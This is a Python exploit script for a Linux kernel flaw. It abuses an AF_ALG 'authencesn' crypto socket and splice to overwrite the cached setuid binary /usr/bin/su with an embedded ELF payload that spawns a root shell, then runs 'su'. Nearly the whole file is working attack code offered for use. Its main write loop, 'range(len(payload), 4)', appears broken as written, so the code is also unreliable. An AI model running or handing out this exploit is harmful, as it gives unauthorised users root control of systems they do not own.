import os
import socket
import sys
import errno

AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279

# default payload supplied by original authors
payload = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00"

if len(sys.argv) == 2: # custom payload is specified
    with open(sys.argv[1], 'rb') as elf: # read bytes of ELF
        payload = elf.read()


def send(fd, offset, chunk):
    conn.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, 3, b'\x00' * 4),
            (SOL_ALG, 2, b'\x10' + b'\x00' * 19),
            (SOL_ALG, 4, b'\x08' + b'\x00' * 3)
        ],
        32768
    )

    length = offset + 4
    read_fd, write_fd = os.pipe()
    os.splice(fd, write_fd, length, offset_src=0)
    os.splice(read_fd, conn.fileno(), length)

    try:
        conn.recv(8 + offset)
    except OSError as e:
        print(f"[recv error] errno={e.errno} ({e.strerror}) at offset={offset}")


# read setuid binary
su_fd = os.open("/usr/bin/su", os.O_RDONLY)

# setup algif_aead socket and bind to vulnerable authencesn
sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

sock.setsockopt(SOL_ALG, 1, bytes.fromhex('0800010000000010' + '0' * 64))
sock.setsockopt(SOL_ALG, 5, None, 4)

conn, _ = sock.accept() # grab connection

for offset in range(len(payload), 4):
    send(su_fd, offset, payload[offset:offset+4])

# run the setuid binary after corrupting it
os.system("su")
